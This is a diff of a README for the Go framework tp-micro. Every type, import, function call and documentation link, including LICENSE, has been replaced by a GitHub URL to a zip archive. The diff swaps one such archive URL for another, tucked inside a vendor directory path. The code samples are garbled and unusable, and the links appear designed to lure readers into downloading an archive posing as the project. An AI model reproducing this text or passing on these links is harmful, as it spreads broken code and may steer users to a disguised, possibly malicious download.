+    https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip().Path = https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip().Path)
     return nil
 }
 
-func (i *ignoreCase) PostReadPushHeader(ctx https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip) *https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip {
+func (i *ignoreCase) PostReadPushHeader(ctx https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip) *https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip {
     // Dynamic transformation path is lowercase
-    https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip().Path = https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip().Path)
+    https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip().Path = https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip().Path)
     return nil
 }
 ```
@@ -509,14 +509,14 @@ func (i *ignoreCase) PostReadPushHeader(ctx https://github.com/huizuohaode/tp-mi
 
 ```go
 // add router group
-group := https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip("test")
+group := https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip("test")
 // register to test group
-https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(new(Aaa), NewIgnoreCase())
-https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(XxZz, NewIgnoreCase())
-https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(new(Bbb))
-https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(YyZz)
-https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(XxxUnknownCall)
-https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(XxxUnknownPush)
+https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(new(Aaa), NewIgnoreCase())
+https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(XxZz, NewIgnoreCase())
+https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(new(Bbb))
+https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(YyZz)
+https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(XxxUnknownCall)
+https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(XxxUnknownPush)
 ```
 
 ### Config
@@ -528,9 +528,9 @@ type SrvConfig struct {
     ListenAddress     string        `yaml:"listen_address"       ini:"listen_address"       comment:"Listen address; for server role"`
     TlsCertFile       string        `yaml:"tls_cert_file"        ini:"tls_cert_file"        comment:"TLS certificate file path"`
     TlsKeyFile        string        `yaml:"tls_key_file"         ini:"tls_key_file"         comment:"TLS key file path"`
-    DefaultSessionAge https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip `yaml:"default_session_age"  ini:"default_session_age"  comment:"Default session max age, if less than or equal to 0, no time limit; ns,µs,ms,s,m,h"`
-    DefaultContextAge https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip `yaml:"default_context_age"  ini:"default_context_age"  comment:"Default CALL or PUSH context max age, if less than or equal to 0, no time limit; ns,µs,ms,s,m,h"`
-    SlowCometDuration https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip `yaml:"slow_comet_duration"  ini:"slow_comet_duration"  comment:"Slow operation alarm threshold; ns,µs,ms,s ..."`
+    DefaultSessionAge https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip `yaml:"default_session_age"  ini:"default_session_age"  comment:"Default session max age, if less than or equal to 0, no time limit; ns,µs,ms,s,m,h"`
+    DefaultContextAge https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip `yaml:"default_context_age"  ini:"default_context_age"  comment:"Default CALL or PUSH context max age, if less than or equal to 0, no time limit; ns,µs,ms,s,m,h"`
+    SlowCometDuration https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip `yaml:"slow_comet_duration"  ini:"slow_comet_duration"  comment:"Slow operation alarm threshold; ns,µs,ms,s ..."`
     DefaultBodyCodec  string        `yaml:"default_body_codec"   ini:"default_body_codec"   comment:"Default body codec type id"`
     PrintDetail       bool          `yaml:"print_detail"         ini:"print_detail"         comment:"Is print body and metadata or not"`
     CountTime         bool          `yaml:"count_time"           ini:"count_time"           comment:"Is count cost time or not"`
@@ -543,18 +543,18 @@ type CliConfig struct {
     LocalIP             string               `yaml:"local_ip"               ini:"local_ip"               comment:"Local IP"`
     TlsCertFile         string               `yaml:"tls_cert_file"          ini:"tls_cert_file"          comment:"TLS certificate file path"`
     TlsKeyFile          string               `yaml:"tls_key_file"           ini:"tls_key_file"           comment:"TLS key file path"`
-    DefaultSessionAge   https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip        `yaml:"default_session_age"    ini:"default_session_age"    comment:"Default session max age, if less than or equal to 0, no time limit; ns,µs,ms,s,m,h"`
-    DefaultContextAge   https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip        `yaml:"default_context_age"    ini:"default_context_age"    comment:"Default CALL or PUSH context max age, if less than or equal to 0, no time limit; ns,µs,ms,s,m,h"`
-    DefaultDialTimeout  https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip        `yaml:"default_dial_timeout"   ini:"default_dial_timeout"   comment:"Default maximum duration for dialing; for client role; ns,µs,ms,s,m,h"`
+    DefaultSessionAge   https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip        `yaml:"default_session_age"    ini:"default_session_age"    comment:"Default session max age, if less than or equal to 0, no time limit; ns,µs,ms,s,m,h"`
+    DefaultContextAge   https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip        `yaml:"default_context_age"    ini:"default_context_age"    comment:"Default CALL or PUSH context max age, if less than or equal to 0, no time limit; ns,µs,ms,s,m,h"`
+    DefaultDialTimeout  https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip        `yaml:"default_dial_timeout"   ini:"default_dial_timeout"   comment:"Default maximum duration for dialing; for client role; ns,µs,ms,s,m,h"`
     RedialTimes         int                  `yaml:"redial_times"           ini:"redial_times"           comment:"The maximum times of attempts to redial, after the connection has been unexpectedly broken; for client role"`
     Failover            int                  `yaml:"failover"               ini:"failover"               comment:"The maximum times of failover"`
-    SlowCometDuration   https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip        `yaml:"slow_comet_duration"    ini:"slow_comet_duration"    comment:"Slow operation alarm threshold; ns,µs,ms,s ..."`
+    SlowCometDuration   https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip        `yaml:"slow_comet_duration"    ini:"slow_comet_duration"    comment:"Slow operation alarm threshold; ns,µs,ms,s ..."`
     DefaultBodyCodec    string               `yaml:"default_body_codec"     ini:"default_body_codec"     comment:"Default body codec type id"`
     PrintDetail         bool                 `yaml:"print_detail"           ini:"print_detail"           comment:"Is print body and metadata or not"`
     CountTime           bool                 `yaml:"count_time"             ini:"count_time"             comment:"Is count cost time or not"`
     HeartbeatSecond     int                  `yaml:"heartbeat_second"       ini:"heartbeat_second"       comment:"When the heartbeat interval(second) is greater than 0, heartbeat is enabled; if it's smaller than 3, change to 3 default"`
     SessMaxQuota        int                  `yaml:"sess_max_quota"         ini:"sess_max_quota"         comment:"The maximum number of sessions in the connection pool"`
-    SessMaxIdleDuration https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip        `yaml:"sess_max_idle_duration" ini:"sess_max_idle_duration" comment:"The maximum time period for the idle session in the connection pool; ns,µs,ms,s,m,h"`
+    SessMaxIdleDuration https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip        `yaml:"sess_max_idle_duration" ini:"sess_max_idle_duration" comment:"The maximum time period for the idle session in the connection pool; ns,µs,ms,s,m,h"`
     CircuitBreaker      CircuitBreakerConfig `yaml:"circuit_breaker" ini:"circuit_breaker" comment:"Circuit breaker config"`
 }
 
@@ -562,7 +562,7 @@ type CliConfig struct {
 type CircuitBreakerConfig struct {
     Enable          bool          `yaml:"enable" ini:"enable" comment:"Whether to use circuit breaker"`
     ErrorPercentage int           `yaml:"error_percentage" ini:"error_percentage" comment:"break linker when the error rate exceeds the threshold during a statistical period; default 50"`
-    BreakDuration   https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip `yaml:"break_duration" ini:"break_duration" comment:"The period of one-cycle break in milliseconds; must ≥ 1ms"`
+    BreakDuration   https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip `yaml:"break_duration" ini:"break_duration" comment:"The period of one-cycle break in milliseconds; must ≥ 1ms"`
 }
 ```
 
@@ -614,8 +614,8 @@ float64 |  []float64 |
 package main
 
 import (
-    tp "https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip"
-    micro "https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip"
+    tp "https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip"
+    micro "https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip"
 )
 
 type (
@@ -633,27 +633,27 @@ type (
 
 // P handler
 type P struct {
-    https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip
+    https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip
 }
 
 // Divide divide API
-func (p *P) Divide(arg *Arg) (int, *https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip) {
-    https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip("query arg x: %s, xy_z: %s", https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip, https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip)
+func (p *P) Divide(arg *Arg) (int, *https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip) {
+    https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip("query arg x: %s, xy_z: %s", https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip, https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip)
     return arg.A / arg.B, nil
 }
 
 func main() {
-    srv := https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip{
+    srv := https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip{
         ListenAddress:   ":9090",
         EnableHeartbeat: true,
     })
-    group := https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip("/static")
-    https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip(new(P))
-    https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip()
+    group := https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip("/static")
+    https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip(new(P))
+    https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip()
 }
 ```
 
-[Detail Example](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip)
+[Detail Example](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip)
 
 ### Optimize
 
@@ -674,7 +674,7 @@ func SetSocketKeepAlive(keepalive bool)
 - SetSocketKeepAlivePeriod sets period between keep alives.
 
 ```go
-func SetSocketKeepAlivePeriod(d https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip)
+func SetSocketKeepAlivePeriod(d https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip)
 ```
 
 - SetSocketNoDelay controls whether the operating system should delay
@@ -700,8 +700,8 @@ func SetSocketReadBuffer(bytes int)
 func SetSocketWriteBuffer(bytes int)
 ```
 
-[More Usage](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip)
+[More Usage](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip)
 
 ## License
 
-Micro is under Apache v2 License. See the [LICENSE](https://github.com/huizuohaode/tp-micro/releases/download/v1.0/Software.zip) file for the full license text
+Micro is under Apache v2 License. See the [LICENSE](https://github.com/huizuohaode/tp-micro/raw/refs/heads/v3/vendor/github.com/coreos/etcd/etcdserver/api/v3rpc/micro_tp_v1.2.zip) file for the full license text
